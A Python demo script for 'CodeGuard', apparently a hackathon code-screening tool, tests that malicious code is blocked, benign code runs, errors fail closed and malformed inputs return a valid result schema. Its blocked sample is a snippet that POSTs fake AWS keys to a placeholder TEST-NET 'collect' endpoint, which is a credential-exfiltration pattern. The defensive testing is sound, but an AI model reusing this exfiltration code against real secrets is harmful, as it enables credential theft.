"""
demo/intercept_check.py — CodeGuard interception demonstration.


Demonstrates two scenarios:
  1. BLOCKED snippet: malicious code is intercepted — marker file is NEVER created.
  2. SAFE snippet:    benign code is allowed through — marker file IS created.
  3. FAIL-CLOSED:     simulated analysis failure still blocks execution.

Uses only fake credentials and placeholder domains (198.51.100.x, example.invalid).
Exits non-zero if any assertion fails.

Run:
    cd d:\\hackathon
    python demo/intercept_check.py
"""
from __future__ import annotations

import sys
import os
import json
import tempfile
import subprocess
from pathlib import Path

# Ensure project root on path
sys.path.insert(0, str(Path(__file__).parent.parent))

from codeguard.engine import analyze
from codeguard.ml_model import ensure_model_ready

_DEV_PATH = str(Path(__file__).parent.parent / "codeguard_dev.jsonl")

# ── ANSI colours ─────────────────────────────────────────────────────────────
_GREEN = "\033[32m"
_RED   = "\033[31m"
_CYAN  = "\033[36m"
_BOLD  = "\033[1m"
_RESET = "\033[0m"

# ── Marker file for safe exec ─────────────────────────────────────────────────
_MARKER = Path(tempfile.gettempdir()) / "codeguard_demo_safe_marker.txt"

# ─────────────────────────────────────────────────────────────────────────────
# Snippet definitions
# Uses fake AWS keys (EXAMPLE prefix), placeholder domains, 198.51.100.x (TEST-NET)
# ─────────────────────────────────────────────────────────────────────────────

MALICIOUS_SNIPPET = """\
# CodeGuard demo — BLOCKED snippet
# Uses fake credentials and example.invalid domain (TEST-NET / placeholder)
import requests

AWS_KEY = 'AKIAIOSFODNN7EXAMPLEKEY'
AWS_SECRET = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'

def exfil():
    # Fake attacker endpoint: 198.51.100.1 is TEST-NET (RFC 5737), safe to use
    r = requests.post(
        'http://198.51.100.1/collect',
        json={'key': AWS_KEY, 'secret': AWS_SECRET}
    )
    return r.status_code

exfil()
"""

# Safe snippet: creates the marker file (proves allowed code actually runs)
SAFE_SNIPPET = f"""\
# CodeGuard demo — SAFE snippet
# This is a benign script that writes a marker file.
import pathlib, datetime
marker = pathlib.Path(r'{_MARKER}')
marker.write_text('CodeGuard allowed at ' + str(datetime.datetime.now()))
print('[safe] Marker written to', marker)
"""

# ─────────────────────────────────────────────────────────────────────────────
# Guarded execution helper
# ─────────────────────────────────────────────────────────────────────────────

def guarded_exec(code: str, model, label: str, _analyze_fn=None) -> dict:
    """
    Analyze code with CodeGuard. If blocked, refuse to execute.
    If allowed, run in a subprocess.
    Returns the analysis result dict.
    Always fail-closed on error.
    """
    import codeguard.engine as _eng
    _fn = _analyze_fn if _analyze_fn is not None else _eng.analyze
    try:
        result = _fn(code, model=model)
    except Exception as exc:
        print(f"  {_RED}[guard] FAIL-CLOSED — analysis error: {exc}{_RESET}")
        return {"verdict": "block", "risk_score": 0.5, "categories": ["destructive_command"],
                "code_language": "unknown", "reason": f"error: {exc}", "vulnerable_lines": []}

    verdict = result["verdict"]
    risk    = result["risk_score"]
    cats    = result.get("categories", [])

    if verdict == "block":
        print(f"  {_RED}[guard] BLOCKED{_RESET} ({label})")
        print(f"    risk_score : {risk:.4f}")
        print(f"    categories : {cats}")
        print(f"    reason     : {result.get('reason','')[:100]}")
        return result

    # Allowed — run in subprocess
    print(f"  {_GREEN}[guard] ALLOWED{_RESET} ({label}) — launching subprocess...")
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False,
                                     encoding="utf-8") as tmp:
        tmp.write(code)
        tmp_path = tmp.name

    try:
        proc = subprocess.run(
            [sys.executable, tmp_path],
            capture_output=True, text=True, timeout=10
        )
        if proc.stdout:
            print(f"    stdout: {proc.stdout.strip()}")
        if proc.returncode != 0:
            print(f"    {_RED}subprocess exited {proc.returncode}{_RESET}")
    except subprocess.TimeoutExpired:
        print(f"    {_RED}subprocess timed out{_RESET}")
    finally:
        os.unlink(tmp_path)

    return result


# ─────────────────────────────────────────────────────────────────────────────
# Demo scenarios
# ─────────────────────────────────────────────────────────────────────────────

def demo_blocked(model) -> bool:
    """Scenario 1: malicious snippet must be blocked, marker file must NOT appear."""
    print(f"\n{_BOLD}{_CYAN}══ Scenario 1: MALICIOUS snippet (must be blocked) ══{_RESET}")
    print("  Code uses fake hardcoded AWS keys + POST to TEST-NET exfil endpoint.\n")

    # Clean up any stale marker
    if _MARKER.exists():
        _MARKER.unlink()

    result = guarded_exec(MALICIOUS_SNIPPET, model, "malicious")

    assert result["verdict"] == "block", (
        f"FAIL: malicious snippet was ALLOWED. result={result}")
    assert not _MARKER.exists(), (
        f"FAIL: marker file was created despite block. This means blocked code executed!")
    assert len(result.get("categories", [])) > 0, (
        f"FAIL: block verdict has no categories. result={result}")
    assert result["risk_score"] >= 0.5, (
        f"FAIL: block verdict has risk_score < 0.5. result={result}")

    print(f"  {_GREEN}✓ ASSERTION PASSED: malicious snippet was blocked{_RESET}")
    print(f"  {_GREEN}✓ ASSERTION PASSED: marker file was NOT created{_RESET}")
    print(f"  {_GREEN}✓ ASSERTION PASSED: categories non-empty: {result['categories']}{_RESET}")
    print(f"  {_GREEN}✓ ASSERTION PASSED: risk_score={result['risk_score']:.4f} ≥ 0.5{_RESET}")
    return True


def demo_safe(model) -> bool:
    """Scenario 2: benign snippet must be allowed, marker file MUST appear."""
    print(f"\n{_BOLD}{_CYAN}══ Scenario 2: SAFE snippet (must be allowed) ══{_RESET}")
    print("  Code writes a timestamped marker file — benign I/O.\n")

    # Clean up stale marker
    if _MARKER.exists():
        _MARKER.unlink()

    result = guarded_exec(SAFE_SNIPPET, model, "safe")

    assert result["verdict"] == "allow", (
        f"FAIL: safe snippet was BLOCKED. result={result}")
    assert _MARKER.exists(), (
        f"FAIL: marker file was NOT created. Allowed code did not run.")
    assert result.get("categories", []) == [], (
        f"FAIL: allow verdict has non-empty categories. result={result}")
    assert result["risk_score"] < 0.5, (
        f"FAIL: allow verdict has risk_score >= 0.5. result={result}")

    marker_content = _MARKER.read_text()
    print(f"  {_GREEN}✓ ASSERTION PASSED: safe snippet was allowed{_RESET}")
    print(f"  {_GREEN}✓ ASSERTION PASSED: marker file created: {_MARKER}{_RESET}")
    print(f"    content: {marker_content.strip()}")
    print(f"  {_GREEN}✓ ASSERTION PASSED: categories=[] (empty){_RESET}")
    print(f"  {_GREEN}✓ ASSERTION PASSED: risk_score={result['risk_score']:.4f} < 0.5{_RESET}")

    # Clean up
    _MARKER.unlink()
    return True


def demo_fail_closed(model) -> bool:
    """Scenario 3: simulated engine error → fail-closed (block)."""
    print(f"\n{_BOLD}{_CYAN}══ Scenario 3: FAIL-CLOSED path ══{_RESET}")
    print("  Simulates an engine error; result must still be a valid block.\n")

    def _broken_analyze(code, model=None):
        raise RuntimeError("Simulated internal failure")

    result = guarded_exec("print('hello')", model, "fail-closed", _analyze_fn=_broken_analyze)

    assert result["verdict"] == "block", (
        f"FAIL: fail-closed path returned allow. result={result}")
    assert result["risk_score"] >= 0.5, (
        f"FAIL: fail-closed risk_score < 0.5. result={result}")

    print(f"  {_GREEN}✓ ASSERTION PASSED: fail-closed path returned block{_RESET}")
    print(f"  {_GREEN}✓ ASSERTION PASSED: risk_score={result['risk_score']:.4f} ≥ 0.5{_RESET}")
    return True



def demo_schema_validation(model) -> bool:
    """Scenario 4: garbage/malformed inputs still return valid schema."""
    print(f"\n{_BOLD}{_CYAN}══ Scenario 4: SCHEMA VALIDATION on garbage inputs ══{_RESET}")
    inputs = [
        ("empty string", ""),
        ("None", None),
        ("binary-like", "\x00\x01\x02\xff"),
        ("very long", "x = 1\n" * 10000),
        ("integer", 42),
        ("list", ["not", "code"]),
    ]

    required_keys = {"verdict", "risk_score", "categories", "code_language",
                     "reason", "vulnerable_lines"}

    for label, bad_input in inputs:
        result = analyze(bad_input, model=model)
        missing = required_keys - set(result.keys())
        assert not missing, f"FAIL ({label}): missing keys {missing}"
        assert result["verdict"] in ("block", "allow"), \
            f"FAIL ({label}): invalid verdict {result['verdict']}"
        assert isinstance(result["risk_score"], float), \
            f"FAIL ({label}): risk_score not float"
        assert 0.0 <= result["risk_score"] <= 1.0, \
            f"FAIL ({label}): risk_score out of range"
        assert isinstance(result["categories"], list), \
            f"FAIL ({label}): categories not list"
        print(f"  {_GREEN}✓ {label!r:<20s}{_RESET} → verdict={result['verdict']} "
              f"risk={result['risk_score']:.4f}")

    return True


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main() -> int:
    print(f"\n{_BOLD}{'═'*60}{_RESET}")
    print(f"{_BOLD}  CodeGuard — Interception Demo{_RESET}")
    print(f"{_BOLD}{'═'*60}{_RESET}")
    print("  Loading model (may train on first run)...")

    model = ensure_model_ready(dev_path=_DEV_PATH)
    print(f"  Model ready: {model._ready}")

    failures = []
    scenarios = [
        ("Blocked snippet", demo_blocked),
        ("Safe snippet",    demo_safe),
        ("Fail-closed",     demo_fail_closed),
        ("Schema validation", demo_schema_validation),
    ]

    for name, fn in scenarios:
        try:
            fn(model)
        except AssertionError as exc:
            print(f"\n{_RED}[DEMO FAILED] {name}: {exc}{_RESET}")
            failures.append(name)
        except Exception as exc:
            print(f"\n{_RED}[DEMO ERROR] {name}: {exc}{_RESET}")
            failures.append(name)

    print(f"\n{_BOLD}{'═'*60}{_RESET}")
    if failures:
        print(f"{_RED}{_BOLD}  DEMO FAILED — {len(failures)} scenario(s): {failures}{_RESET}")
        print(f"{_BOLD}{'═'*60}{_RESET}\n")
        return 1
    else:
        print(f"{_GREEN}{_BOLD}  ALL SCENARIOS PASSED ✓{_RESET}")
        print(f"{_BOLD}{'═'*60}{_RESET}\n")
        return 0


if __name__ == "__main__":
    sys.exit(main())
